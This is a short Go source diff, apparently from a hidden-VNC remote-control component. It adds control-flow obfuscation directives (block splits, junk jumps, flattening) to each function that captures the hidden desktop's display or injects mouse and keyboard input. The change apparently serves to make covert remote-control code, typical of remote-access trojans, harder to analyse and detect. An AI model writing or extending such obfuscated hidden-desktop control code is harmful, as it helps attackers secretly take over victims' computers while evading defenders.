@@ -805,6 +805,7 @@ func hvncEnsureCapCache(w, h int) (uintptr, uintptr, []byte, bool) {
 }
 
 func hvncCaptureDisplayOnThread(display int) (*image.RGBA, error) {
+	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	captureMu.Lock()
 	defer captureMu.Unlock()
 
@@ -995,6 +996,7 @@ func isExplorerRunningToolhelp() bool {
 }
 
 func hvncMouseMoveOnThread(display int, x, y int32) error {
+	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	bounds, _ := hvncResolveCaptureBounds(display)
 	if bounds.Dx() <= 0 || bounds.Dy() <= 0 {
 		hvncInputMu.Lock()
@@ -1059,6 +1061,7 @@ func hvncMouseMoveOnThread(display int, x, y int32) error {
 }
 
 func hvncMouseButtonOnThread(button int, down bool) error {
+	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	pt := currentHVNCCursor()
 
 	if button == 0 && !down {
@@ -1169,6 +1172,7 @@ func hvncMouseButtonOnThread(button int, down bool) error {
 }
 
 func hvncKeyOnThread(vk uint16, down bool) error {
+	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	pt := currentHVNCCursor()
 	hwnd := windowFromPoint(pt)
 	if hwnd == 0 {
